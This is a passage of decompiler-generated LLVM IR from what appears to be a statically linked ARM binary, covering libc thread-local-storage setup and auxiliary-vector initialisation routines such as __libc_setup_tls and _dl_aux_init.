  %v2_17d3c = load i32, i32* %v1_17d3c, align 4
  %v4_17d40 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_2223c.361 to i32), i32 52) to i32*), align 4
  store i32 %v4_17d40, i32* %lr.global-to-local, align 4
  store i32 144, i32* %r3.global-to-local, align 4
  %v1_17d48 = add i32 %v2_17d3c, 15
  %v4_17d4c = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_2223c.361 to i32), i32 144) to i32*), align 4
  store i32 %v4_17d4c, i32* @ip, align 4
  %v1_17d50 = load i32, i32* @r0, align 4
  %v2_17d50 = add i32 %v1_17d50, %v1_17d48
  %v1_17d54 = inttoptr i32 %v4_17d2c to i32*
  %v2_17d54 = load i32, i32* %v1_17d54, align 4
  store i32 %v2_17d54, i32* %r3.global-to-local, align 4
  %v1_17d58 = and i32 %v2_17d50, -16
  store i32 %v1_17d58, i32* %v1_17d3c, align 4
  %v0_17d60 = load i32, i32* @r0, align 4
  %v1_17d60 = load i32, i32* %r4.global-to-local, align 4
  %v2_17d60 = inttoptr i32 %v1_17d60 to i32*
  store i32 %v0_17d60, i32* %v2_17d60, align 4
  %v0_17d64 = load i32, i32* @r1, align 4
  %v1_17d64 = load i32, i32* %lr.global-to-local, align 4
  %v2_17d64 = inttoptr i32 %v1_17d64 to i32*
  store i32 %v0_17d64, i32* %v2_17d64, align 4
  %v0_17d68 = load i32, i32* %r3.global-to-local, align 4
  %v1_17d68 = load i32, i32* @ip, align 4
  %v2_17d68 = inttoptr i32 %v1_17d68 to i32*
  store i32 %v0_17d68, i32* %v2_17d68, align 4
  %v2_17d6c = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_17d6c, i32* %r4.global-to-local, align 4
  %v1_17d70 = load i32, i32* @r0, align 4
  ret i32 %v1_17d70

; uselistorder directives
  uselistorder i32 -16, { 21, 6, 7, 8, 9, 10, 11, 12, 13, 14, 5, 4, 3, 1, 15, 16, 17, 18, 19, 20, 2, 0 }
}

define i32 @function_17d78(i32 %arg1) local_unnamed_addr {
dec_label_pc_17d78:
  %v0_17d78 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_17d78, label %bb, label %.thread3

bb:                                               ; preds = %dec_label_pc_17d78
  br label %.thread3

.thread3:                                         ; preds = %dec_label_pc_17d78, %bb
  %v4_17d88 = phi i32 [ %arg1, %dec_label_pc_17d78 ], [ 0, %bb ]
  ret i32 %v4_17d88

; uselistorder directives
  uselistorder label %.thread3, { 1, 0 }
}

define i32 @_dl_tls_setup(i32 %arg1) local_unnamed_addr {
entry:
  %r3.global-to-local = alloca i32, align 4
  store i32 ptrtoint (i32* @global_var_2223c.361 to i32), i32* %r3.global-to-local, align 4
  %v4_17d9c = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_2223c.361 to i32), i32 84) to i32*), align 4
  store i32 %v4_17d9c, i32* @lr, align 4
  %v4_17da8 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_2223c.361 to i32), i32 60) to i32*), align 4
  store i32 64, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_2223c.361 to i32), i32 10748) to i32*), align 4
  store i32 add (i32 ptrtoint (i32* @global_var_2223c.361 to i32), i32 10748), i32* %r3.global-to-local, align 4
  store i32 0, i32* @r0, align 4
  store i32 16, i32* @r1, align 4
  %v2_17dc8 = inttoptr i32 %v4_17da8 to i32*
  store i32 1, i32* %v2_17dc8, align 4
  %v0_17dcc = load i32, i32* %r3.global-to-local, align 4
  %v1_17dcc = load i32, i32* @lr, align 4
  %v2_17dcc = inttoptr i32 %v1_17dcc to i32*
  store i32 %v0_17dcc, i32* %v2_17dcc, align 4
  %v0_17dd0 = call i32 @init_static_tls()
  ret i32 0
}

define i32 @function_17de8(i32* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_17de8:
  %r0.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %v0_17de8 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_17de8, label %bb, label %.thread1

bb:                                               ; preds = %dec_label_pc_17de8
  %v2_17de8 = load i32, i32* @r4, align 4
  %v8_17de8 = ashr i32 %v2_17de8, %tmp
  %v9_17de8 = and i32 %v8_17de8, %tmp
  %v2_17dec = load i32, i32* @ip, align 4
  %v8_17dec = lshr i32 %v2_17dec, %v9_17de8
  %v9_17dec = and i32 %v8_17dec, %v9_17de8
  store i32 %v9_17dec, i32* %r0.global-to-local, align 4
  %v4_17df0 = inttoptr i32 %v9_17dec to i32*
  store i32 %arg2, i32* %v4_17df0, align 4
  %v5_17df0 = load i32, i32* @ip, align 4
  %v6_17df0 = load i32, i32* %r0.global-to-local, align 4
  %v7_17df0 = sub i32 %v6_17df0, %v5_17df0
  store i32 %v7_17df0, i32* %r0.global-to-local, align 4
  br label %.thread1

.thread1:                                         ; preds = %dec_label_pc_17de8, %bb
  %v8_17df0 = phi i32 [ %tmp, %dec_label_pc_17de8 ], [ %v7_17df0, %bb ]
  ret i32 %v8_17df0

; uselistorder directives
  uselistorder i32 %tmp, { 1, 0, 2, 3 }
  uselistorder i32* %r0.global-to-local, { 1, 2, 3, 0 }
  uselistorder label %.thread1, { 1, 0 }
}

define i32 @__tls_get_addr(i32 %arg1) local_unnamed_addr {
entry:
  %v0_17dfc = call i32 @__aeabi_read_tp()
  %v1_17e00 = inttoptr i32 %v0_17dfc to i32*
  %v2_17e00 = load i32, i32* %v1_17e00, align 4
  %v1_17e04 = add i32 %arg1, 4
  %v2_17e04 = inttoptr i32 %v1_17e04 to i32*
  %v3_17e04 = load i32, i32* %v2_17e04, align 4
  %v1_17e08 = add i32 %v2_17e00, 8
  %v2_17e08 = inttoptr i32 %v1_17e08 to i32*
  %v3_17e08 = load i32, i32* %v2_17e08, align 4
  %v2_17e0c = add i32 %v3_17e08, %v3_17e04
  ret i32 %v2_17e0c
}

define i32 @__libc_setup_tls(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %fp.global-to-local = alloca i32, align 4
  %ip.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-36 = alloca i32, align 4
  %v3_17e18 = load i32, i32* @r4, align 4
  store i32 %v3_17e18, i32* %stack_var_-36, align 4
  %v6_17e18 = load i32, i32* @r5, align 4
  %v15_17e18 = load i32, i32* @r8, align 4
  %v18_17e18 = load i32, i32* @sb, align 4
  %v21_17e18 = load i32, i32* @sl, align 4
  %v24_17e18 = load i32, i32* @fp, align 4
  %v27_17e18 = load i32, i32* @lr, align 4
  store i32 104, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_2223c.361 to i32), i32* %sl.global-to-local, align 4
  %v4_17e28 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_2223c.361 to i32), i32 104) to i32*), align 4
  store i32 %v4_17e28, i32* %r3.global-to-local, align 4
  %v1_17e2c = inttoptr i32 %v4_17e28 to i32*
  %v2_17e2c = load i32, i32* %v1_17e2c, align 4
  store i32 %v2_17e2c, i32* %r2.global-to-local, align 4
  %v2_17e30 = icmp eq i32 %v2_17e2c, 0
  %v0_17e38 = load i32, i32* %r0.global-to-local, align 4
  %v0_17e3c = load i32, i32* %r1.global-to-local, align 4
  store i32 %v0_17e3c, i32* %ip.global-to-local, align 4
  br i1 %v2_17e30, label %dec_label_pc_18004, label %dec_label_pc_17e44

dec_label_pc_17e44:                               ; preds = %entry
  store i32 156, i32* %r3.global-to-local, align 4
  %v4_17e48 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_2223c.361 to i32), i32 156) to i32*), align 4
  store i32 %v4_17e48, i32* @lr, align 4
  store i32 %v2_17e2c, i32* %r1.global-to-local, align 4
  %v1_17e90 = inttoptr i32 %v4_17e48 to i32*
  %v2_17e9061 = load i32, i32* %v1_17e90, align 4
  %v4_17e9462 = mul i32 %v2_17e9061, 32
  %v5_17e9463 = add i32 %v4_17e9462, %v2_17e2c
  store i32 %v5_17e9463, i32* %r3.global-to-local, align 4
  %v3_17e9865 = icmp ult i32 %v2_17e2c, %v5_17e9463
  br i1 %v3_17e9865, label %dec_label_pc_17e54, label %dec_label_pc_18004.loopexit

dec_label_pc_17e54:                               ; preds = %dec_label_pc_17e44, %dec_label_pc_17e8c
  %v0_17e6c66 = phi i32 [ %v1_17e8c, %dec_label_pc_17e8c ], [ %v2_17e2c, %dec_label_pc_17e44 ]
  %v1_17e54 = inttoptr i32 %v0_17e6c66 to i32*
  %v2_17e54 = load i32, i32* %v1_17e54, align 4
  store i32 %v2_17e54, i32* %r3.global-to-local, align 4
  %v7_17e58 = icmp eq i32 %v2_17e54, 7
  br i1 %v7_17e58, label %dec_label_pc_17e60, label %dec_label_pc_17e8c

dec_label_pc_17e60:                               ; preds = %dec_label_pc_17e54
  %v1_17e60 = add i32 %v0_17e6c66, 20
  %v2_17e60 = inttoptr i32 %v1_17e60 to i32*
  %v3_17e60 = load i32, i32* %v2_17e60, align 4
  store i32 %v3_17e60, i32* %r3.global-to-local, align 4
  %v1_17e64 = add i32 %v0_17e6c66, 28
  %v2_17e64 = inttoptr i32 %v1_17e64 to i32*
  %v3_17e64 = load i32, i32* %v2_17e64, align 4
  store i32 %v3_17e64, i32* @r6, align 4
  %v1_17e6c = add i32 %v0_17e6c66, 16
  %v2_17e6c = inttoptr i32 %v1_17e6c to i32*
  %v3_17e6c = load i32, i32* %v2_17e6c, align 4
  store i32 %v3_17e6c, i32* %r3.global-to-local, align 4
  %v1_17e70 = add i32 %v0_17e6c66, 8
  %v2_17e70 = inttoptr i32 %v1_17e70 to i32*
  %v3_17e70 = load i32, i32* %v2_17e70, align 4
  store i32 %v3_17e70, i32* %r1.global-to-local, align 4
  %tmp78 = icmp ule i32 %v3_17e64, %v0_17e3c
  %v0_17e3c.v3_17e64 = select i1 %tmp78, i32 %v0_17e3c, i32 %v3_17e64
  store i32 %v0_17e3c.v3_17e64, i32* %fp.global-to-local, align 4
  %v2_17ea8 = icmp eq i32 %v3_17e64, 0
  br i1 %v2_17ea8, label %dec_label_pc_17ed0, label %bb

dec_label_pc_17e8c:                               ; preds = %dec_label_pc_17e54
  %v1_17e8c = add i32 %v0_17e6c66, 32
  store i32 %v1_17e8c, i32* %r1.global-to-local, align 4
  %v2_17e90 = load i32, i32* %v1_17e90, align 4
  %v4_17e94 = mul i32 %v2_17e90, 32
  %v5_17e94 = add i32 %v4_17e94, %v2_17e2c
  store i32 %v5_17e94, i32* %r3.global-to-local, align 4
  %v3_17e98 = icmp ult i32 %v1_17e8c, %v5_17e94
  br i1 %v3_17e98, label %dec_label_pc_17e54, label %dec_label_pc_17e90.dec_label_pc_18004.loopexit_crit_edge

bb:                                               ; preds = %dec_label_pc_17e60
  %v2_17eac = add i32 %v3_17e64, -1
  br label %dec_label_pc_17ed4

dec_label_pc_17ed0:                               ; preds = %dec_label_pc_17e60, %dec_label_pc_18004
  %v0_17ee4.pre = phi i32 [ %v0_17ee4.pre.pre, %dec_label_pc_18004 ], [ ptrtoint (i32* @global_var_2223c.361 to i32), %dec_label_pc_17e60 ]
  %v1_17ed4.pre = phi i32 [ %v1_17ed4.pre.pre, %dec_label_pc_18004 ], [ %v0_17e38, %dec_label_pc_17e60 ]
  %v1_17ef825 = phi i32 [ %v0_1800c, %dec_label_pc_18004 ], [ %v0_17e3c.v3_17e64, %dec_label_pc_17e60 ]
  %stack_var_-52.0 = phi i32 [ 0, %dec_label_pc_18004 ], [ %v3_17e60, %dec_label_pc_17e60 ]
  %stack_var_-48.0 = phi i32 [ 0, %dec_label_pc_18004 ], [ %v3_17e6c, %dec_label_pc_17e60 ]
  %stack_var_-44.0 = phi i32 [ 0, %dec_label_pc_18004 ], [ %v3_17e70, %dec_label_pc_17e60 ]
  br label %dec_label_pc_17ed4

dec_label_pc_17ed4:                               ; preds = %bb, %dec_label_pc_17ed0
  %storemerge80 = phi i32 [ %v2_17eac, %bb ], [ 0, %dec_label_pc_17ed0 ]
  %v0_17ed4 = phi i32 [ %v2_17eac, %bb ], [ 0, %dec_label_pc_17ed0 ]
  %storemerge = phi i32 [ %v3_17e64, %bb ], [ 1, %dec_label_pc_17ed0 ]
  %storemerge79 = phi i32 [ %v3_17e64, %bb ], [ 1, %dec_label_pc_17ed0 ]
  %v0_17ee4 = phi i32 [ ptrtoint (i32* @global_var_2223c.361 to i32), %bb ], [ %v0_17ee4.pre, %dec_label_pc_17ed0 ]
  %v1_17ed4 = phi i32 [ %v0_17e38, %bb ], [ %v1_17ed4.pre, %dec_label_pc_17ed0 ]
  %v1_17ef8 = phi i32 [ %v0_17e3c.v3_17e64, %bb ], [ %v1_17ef825, %dec_label_pc_17ed0 ]
  %stack_var_-52.3 = phi i32 [ %v3_17e60, %bb ], [ %stack_var_-52.0, %dec_label_pc_17ed0 ]
  %stack_var_-48.3 = phi i32 [ %v3_17e6c, %bb ], [ %stack_var_-48.0, %dec_label_pc_17ed0 ]
  %stack_var_-44.3 = phi i32 [ %v3_17e70, %bb ], [ %stack_var_-44.0, %dec_label_pc_17ed0 ]
  store i32 %storemerge80, i32* %r0.global-to-local, align 4
  store i32 %storemerge79, i32* %r1.global-to-local, align 4
  store i32 %storemerge, i32* @r4, align 4
  %v2_17ed4 = add i32 %v1_17ed4, %v0_17ed4
  %v2_17ed8 = udiv i32 %v2_17ed4, %storemerge
  store i32 %v2_17ed8, i32* %r0.global-to-local, align 4
  %v2_17edc = mul i32 %v2_17ed8, %storemerge
  store i32 %v2_17edc, i32* %sb.global-to-local, align 4
  store i32 72, i32* %r3.global-to-local, align 4
  %v2_17ee4 = add i32 %v0_17ee4, 72
  %v3_17ee4 = inttoptr i32 %v2_17ee4 to i32*
  %v4_17ee4 = load i32, i32* %v3_17ee4, align 4
  store i32 %v4_17ee4, i32* %r3.global-to-local, align 4
  %v1_17ee8 = inttoptr i32 %v4_17ee4 to i32*
  %v2_17ee8 = load i32, i32* %v1_17ee8, align 4
  store i32 %stack_var_-52.3, i32* %r3.global-to-local, align 4
  %v1_17ef0 = add i32 %v1_17ef8, 1168
  %v2_17ef4 = add i32 %v1_17ef0, %stack_var_-52.3
  %v2_17ef8 = add i32 %v2_17ef4, %v2_17edc
  %v2_17efc = add i32 %v2_17ef8, %v2_17ee8
  store i32 %v2_17efc, i32* %r0.global-to-local, align 4
  %v1_17f00 = call i32 @__GI_sbrk(i32 %v2_17efc)
  %v1_17f04 = load i32, i32* %fp.global-to-local, align 4
  %v1_17f0c = sub i32 0, %v1_17f04
  store i32 10236, i32* %r4.global-to-local, align 4
  %v2_17f04 = add i32 %v1_17f00, 1167
  %v1_17f14 = add i32 %v2_17f04, %v1_17f04
  %v2_17f18 = and i32 %v1_17f14, %v1_17f0c
  store i32 %v2_17f18, i32* @r5, align 4
  %v1_17f20 = load i32, i32* %sl.global-to-local, align 4
  %v3_17f20 = add i32 %v1_17f20, 10236
  %v4_17f20 = inttoptr i32 %v3_17f20 to i32*
  store i32 62, i32* %v4_17f20, align 4
  %v0_17f28 = load i32, i32* @r5, align 4
  %v1_17f28 = load i32, i32* %sb.global-to-local, align 4
  %v2_17f28 = add i32 %v1_17f28, %v0_17f28
  store i32 %v2_17f28, i32* @ip, align 4
  %v0_17f2c = load i32, i32* %sl.global-to-local, align 4
  %v1_17f2c = load i32, i32* %r4.global-to-local, align 4
  %v2_17f2c = add i32 %v1_17f2c, %v0_17f2c
  store i32 %v2_17f2c, i32* %r4.global-to-local, align 4
  %v2_17f30 = add i32 %v0_17f2c, 11524
  store i32 %v2_17f30, i32* %r8.global-to-local, align 4
  store i32 1, i32* @r3, align 4
  store i32 %stack_var_-44.3, i32* @r1, align 4
  store i32 %stack_var_-48.3, i32* @r2, align 4
  store i32 %v2_17f28, i32* @r0, align 4
  %v2_17f44 = add i32 %v2_17f2c, 16
  %v3_17f44 = inttoptr i32 %v2_17f44 to i32*
  store i32 %v2_17f28, i32* %v3_17f44, align 4
  %v0_17f48 = load i32, i32* %sb.global-to-local, align 4
  %v1_17f48 = load i32, i32* %r8.global-to-local, align 4
  %v2_17f48 = add i32 %v1_17f48, 40
  %v3_17f48 = inttoptr i32 %v2_17f48 to i32*
  store i32 %v0_17f48, i32* %v3_17f48, align 4
  %v0_17f4c = load i32, i32* @r3, align 4
  %v1_17f4c = trunc i32 %v0_17f4c to i8
  %v2_17f4c = load i32, i32* %r4.global-to-local, align 4
  %v3_17f4c = add i32 %v2_17f4c, 20
  %v4_17f4c = inttoptr i32 %v3_17f4c to i8*
  store i8 %v1_17f4c, i8* %v4_17f4c, align 1
  %v0_17f50 = load i32, i32* %r4.global-to-local, align 4
  %v1_17f50 = add i32 %v0_17f50, 8
  store i32 %v1_17f50, i32* @r4, align 4
  %v0_17f54 = call i32 @memcpy()
  %v0_17f5c = load i32, i32* @r4, align 4
  %v1_17f5c = load i32, i32* @r5, align 4
  %v2_17f5c = inttoptr i32 %v1_17f5c to i32*
  store i32 %v0_17f5c, i32* %v2_17f5c, align 4
  %v0_17f60 = load i32, i32* @r5, align 4
  store i32 %v0_17f60, i32* %r0.global-to-local, align 4
  %tmp = icmp ugt i32 %v0_17f60, -4096
  call void @__pseudo_cond_branch(i1 %tmp, i32 ptrtoint (i32* @global_var_13858.560 to i32))
  store i32 84, i32* %r3.global-to-local, align 4
  %v0_17f74 = load i32, i32* %sl.global-to-local, align 4
  %v2_17f74 = add i32 %v0_17f74, 84
  %v3_17f74 = inttoptr i32 %v2_17f74 to i32*
  %v4_17f74 = load i32, i32* %v3_17f74, align 4
  store i32 %v4_17f74, i32* %ip.global-to-local, align 4
  store i32 60, i32* %r3.global-to-local, align 4
  store i32 10748, i32* %r1.global-to-local, align 4
  %v2_17f80 = add i32 %v0_17f74, 60
  %v3_17f80 = inttoptr i32 %v2_17f80 to i32*
  %v4_17f80 = load i32, i32* %v3_17f80, align 4
  store i32 %v4_17f80, i32* %r0.global-to-local, align 4
  %v3_17f88 = add i32 %v0_17f74, 10748
  %v4_17f88 = inttoptr i32 %v3_17f88 to i32*
  store i32 64, i32* %v4_17f88, align 4
  %v1_17f90 = load i32, i32* %r8.global-to-local, align 4
  %v2_17f90 = add i32 %v1_17f90, 20
  %v3_17f90 = inttoptr i32 %v2_17f90 to i32*
  store i32 %stack_var_-44.3, i32* %v3_17f90, align 4
  %v1_17f98 = load i32, i32* %r8.global-to-local, align 4
  %v2_17f98 = add i32 %v1_17f98, 24
  %v3_17f98 = inttoptr i32 %v2_17f98 to i32*
  store i32 %stack_var_-48.3, i32* %v3_17f98, align 4
  %v1_17fa0 = load i32, i32* %r0.global-to-local, align 4
  %v2_17fa0 = inttoptr i32 %v1_17fa0 to i32*
  store i32 1, i32* %v2_17fa0, align 4
  %v1_17fa8 = load i32, i32* %r8.global-to-local, align 4
  %v2_17fa8 = add i32 %v1_17fa8, 28
  %v3_17fa8 = inttoptr i32 %v2_17fa8 to i32*
  store i32 %stack_var_-52.3, i32* %v3_17fa8, align 4
  %v0_17fb0 = load i32, i32* @r6, align 4
  %v2_17fb0 = icmp eq i32 %v0_17fb0, 0
  %v1_17fb4 = load i32, i32* %r8.global-to-local, align 4
  %v2_17fb4 = add i32 %v1_17fb4, 44
  %v3_17fb4 = inttoptr i32 %v2_17fb4 to i32*
  store i32 1, i32* %v3_17fb4, align 4
  store i32 %stack_var_-52.3, i32* %r3.global-to-local, align 4
  %v0_17fbc = load i32, i32* %sl.global-to-local, align 4
  %v1_17fbc = load i32, i32* %r1.global-to-local, align 4
  %v2_17fbc = add i32 %v1_17fbc, %v0_17fbc
  store i32 %v2_17fbc, i32* %r2.global-to-local, align 4
  %v1_17fc0 = load i32, i32* @r6, align 4
  br i1 %v2_17fb0, label %.thread33, label %bb52

.thread33:                                        ; preds = %dec_label_pc_17ed4
  store i32 %v1_17fc0, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  %v1_17fcc34 = load i32, i32* %r8.global-to-local, align 4
  %v2_17fcc35 = add i32 %v1_17fcc34, 32
  %v3_17fcc36 = inttoptr i32 %v2_17fcc35 to i32*
  store i32 %v1_17fc0, i32* %v3_17fcc36, align 4
  br label %bb53

bb52:                                             ; preds = %dec_label_pc_17ed4
  %v2_17fc4 = add i32 %v1_17fc0, -1
  store i32 %v2_17fc4, i32* %r0.global-to-local, align 4
  %v1_17fcc = load i32, i32* %r8.global-to-local, align 4
  %v2_17fcc = add i32 %v1_17fcc, 32
  %v3_17fcc = inttoptr i32 %v2_17fcc to i32*
  store i32 %v1_17fc0, i32* %v3_17fcc, align 4
  %v1_17fd0 = load i32, i32* @r6, align 4
  store i32 %v1_17fd0, i32* %r1.global-to-local, align 4
  br label %bb53

bb53:                                             ; preds = %.thread33, %bb52
  %v0_17fd4 = load i32, i32* %r8.global-to-local, align 4
  %v1_17fd4 = load i32, i32* %r2.global-to-local, align 4
  %v2_17fd4 = add i32 %v1_17fd4, 28
  %v3_17fd4 = inttoptr i32 %v2_17fd4 to i32*
  store i32 %v0_17fd4, i32* %v3_17fd4, align 4
  %v0_17fd8 = load i32, i32* %r2.global-to-local, align 4
  %v1_17fd8 = load i32, i32* %ip.global-to-local, align 4
  %v2_17fd8 = inttoptr i32 %v1_17fd8 to i32*
  store i32 %v0_17fd8, i32* %v2_17fd8, align 4
  %v0_17fdc = load i32, i32* %r0.global-to-local, align 4
  %v1_17fdc = load i32, i32* %r3.global-to-local, align 4
  %v2_17fdc = add i32 %v1_17fdc, %v0_17fdc
  store i32 %v2_17fdc, i32* %r0.global-to-local, align 4
  %v1_17fe0 = load i32, i32* %r1.global-to-local, align 4
  br i1 %v2_17fb0, label %bb54, label %._crit_edge

._crit_edge:                                      ; preds = %bb53
  %v0_17fe8.pre = load i32, i32* @r6, align 4
  br label %bb55

bb54:                                             ; preds = %bb53
  br label %bb55

bb55:                                             ; preds = %._crit_edge, %bb54
  %v0_17fe8 = phi i32 [ %v0_17fe8.pre, %._crit_edge ], [ %v1_17fe0, %bb54 ]
  %v2_17fe4 = udiv i32 %v2_17fdc, %v1_17fe0
  %v2_17fe8 = load i32, i32* %sb.global-to-local, align 4
  %v3_17fe8 = mul i32 %v2_17fe4, %v0_17fe8
  %v4_17fe8 = add i32 %v2_17fe8, %v3_17fe8
  store i32 %v4_17fe8, i32* @r0, align 4
  %v0_17fec = load i32, i32* %fp.global-to-local, align 4
  %v2_17fec = icmp ult i32 %v0_17fec, 16
  %v0_17fec. = select i1 %v2_17fec, i32 16, i32 %v0_17fec
  store i32 %v0_17fec., i32* @r1, align 4
  %v2_17ffc = load i32, i32* %stack_var_-36, align 4
  store i32 %v2_17ffc, i32* @r4, align 4
  store i32 %v6_17e18, i32* @r5, align 4
  store i32 %v15_17e18, i32* %r8.global-to-local, align 4
  store i32 %v18_17e18, i32* %sb.global-to-local, align 4
  store i32 %v21_17e18, i32* %sl.global-to-local, align 4
  store i32 %v24_17e18, i32* %fp.global-to-local, align 4
  store i32 %v27_17e18, i32* @lr, align 4
  %v0_18000 = call i32 @init_static_tls()
  store i32 %v0_18000, i32* %r0.global-to-local, align 4
  %v0_1800c.pre = load i32, i32* @ip, align 4
  %v1_17ed4.pre.pre.pre = load i32, i32* @r5, align 4
  %v0_17ee4.pre.pre.pre = load i32, i32* %sl.global-to-local, align 4
  br label %dec_label_pc_18004

dec_label_pc_17e90.dec_label_pc_18004.loopexit_crit_edge: ; preds = %dec_label_pc_17e8c
  br label %dec_label_pc_18004.loopexit

dec_label_pc_18004.loopexit:                      ; preds = %dec_label_pc_17e90.dec_label_pc_18004.loopexit_crit_edge, %dec_label_pc_17e44
  br label %dec_label_pc_18004

dec_label_pc_18004:                               ; preds = %dec_label_pc_18004.loopexit, %entry, %bb55
  %v0_17ee4.pre.pre = phi i32 [ ptrtoint (i32* @global_var_2223c.361 to i32), %dec_label_pc_18004.loopexit ], [ ptrtoint (i32* @global_var_2223c.361 to i32), %entry ], [ %v0_17ee4.pre.pre.pre, %bb55 ]
  %v1_17ed4.pre.pre = phi i32 [ %v0_17e38, %dec_label_pc_18004.loopexit ], [ %v0_17e38, %entry ], [ %v1_17ed4.pre.pre.pre, %bb55 ]
  %v0_1800c = phi i32 [ %v0_17e3c, %dec_label_pc_18004.loopexit ], [ %v0_17e3c, %entry ], [ %v0_1800c.pre, %bb55 ]
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 0, i32* @r6, align 4
  store i32 %v0_1800c, i32* %fp.global-to-local, align 4
  br label %dec_label_pc_17ed0

; uselistorder directives
  uselistorder i32 %v0_1800c, { 1, 0 }
  uselistorder i32 %v1_17fc0, { 1, 0, 2, 3 }
  uselistorder i32 %v0_17f2c, { 1, 0 }
  uselistorder i32 %v2_17f28, { 1, 0, 2 }
  uselistorder i32 %stack_var_-52.3, { 1, 2, 0, 3 }
  uselistorder i32 %v1_17e8c, { 2, 1, 0 }
  uselistorder i32 %v3_17e64, { 1, 0, 4, 5, 3, 2, 6 }
  uselistorder i32 %v0_17e6c66, { 4, 1, 0, 3, 2, 5 }
  uselistorder i32* %v1_17e90, { 1, 0 }
  uselistorder i32 %v0_17e3c, { 2, 3, 1, 0, 4 }
  uselistorder i32 %v0_17e38, { 1, 2, 0, 3 }
  uselistorder i32 %v2_17e2c, { 4, 0, 1, 2, 3, 5, 6 }
  uselistorder i32* %r8.global-to-local, { 0, 2, 3, 1, 4, 5, 6, 7, 8, 9 }
  uselistorder i32* %r3.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 11, 8, 9, 10, 15, 12, 13, 14 }
  uselistorder i32* %r1.global-to-local, { 5, 4, 6, 7, 8, 0, 10, 9, 3, 1, 2 }
  uselistorder i32* %r0.global-to-local, { 3, 4, 6, 5, 7, 8, 9, 10, 11, 12, 0, 1, 2 }
  uselistorder i32 ()* @init_static_tls, { 1, 0 }
  uselistorder i32 10748, { 0, 2, 1 }
  uselistorder i32 84, { 1, 2, 3, 4, 5, 0, 6, 7 }
  uselistorder i32 -4096, { 0, 2, 1, 4, 3, 6, 5, 7, 8 }
  uselistorder i32 62, { 1, 3, 2, 0 }
  uselistorder i32 (i32)* @__GI_sbrk, { 0, 7, 6, 5, 4, 3, 2, 1 }
  uselistorder label %dec_label_pc_18004, { 0, 2, 1 }
  uselistorder label %bb55, { 1, 0 }
  uselistorder label %bb53, { 1, 0 }
  uselistorder label %dec_label_pc_17ed4, { 1, 0 }
  uselistorder label %dec_label_pc_17ed0, { 1, 0 }
  uselistorder label %dec_label_pc_17e54, { 1, 0 }
}

define i32 @function_18024(i32* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_18024:
  %v0_18024 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_18024, label %.thread2, label %.thread7

.thread2:                                         ; preds = %dec_label_pc_18024
  call void @llvm.trap()
  unreachable

.thread7:                                         ; preds = %dec_label_pc_18024
  %tmp = ptrtoint i32* %arg1 to i32
  ret i32 %tmp
}

define i32 @__pthread_initialize_minimal() local_unnamed_addr {
entry:
  %v2_18050 = call i32 @__libc_setup_tls(i32 8, i32 16)
  ret i32 %v2_18050
}

define i32 @_dl_aux_init(i32 %arg1) local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 ptrtoint (i32* @global_var_2223c.361 to i32), i32* %r2.global-to-local, align 4
  %v4_18060 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_2223c.361 to i32), i32 156) to i32*), align 4
  %v4_18068 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_2223c.361 to i32), i32 104) to i32*), align 4
  store i32 %v4_18068, i32* %r1.global-to-local, align 4
  %v1_1806c = add i32 %arg1, 44
  %v2_1806c = inttoptr i32 %v1_1806c to i32*
  %v3_1806c = load i32, i32* %v2_1806c, align 4
  %v1_18070 = add i32 %arg1, 28
  %v2_18070 = inttoptr i32 %v1_18070 to i32*
  %v3_18070 = load i32, i32* %v2_18070, align 4
  store i32 %v3_18070, i32* %r2.global-to-local, align 4
  %v2_18074 = inttoptr i32 %v4_18060 to i32*
  store i32 %v3_1806c, i32* %v2_18074, align 4
  %v0_18078 = load i32, i32* %r2.global-to-local, align 4
  %v1_18078 = load i32, i32* %r1.global-to-local, align 4
  %v2_18078 = inttoptr i32 %v1_18078 to i32*
  store i32 %v0_18078, i32* %v2_18078, align 4
  ret i32 %arg1

; uselistorder directives
  uselistorder i32 104, { 0, 1, 2, 4, 6, 3, 5 }
  uselistorder i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_2223c.361 to i32), i32 156) to i32*), { 1, 0 }
  uselistorder i32 %arg1, { 0, 2, 1 }
}

define i32 @function_18084(i32 %arg1) local_unnamed_addr {
dec_label_pc_18084:
  %v0_18084 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_18084, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_18084
  %v1_18084 = load i32, i32* @ip, align 4
  %v3_18084 = mul i32 %v1_18084, %arg1
  %v2_18088 = load i32, i32* @r8, align 4
  %v4_18088 = and i32 %v2_18088, %v3_18084
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_18084, %bb
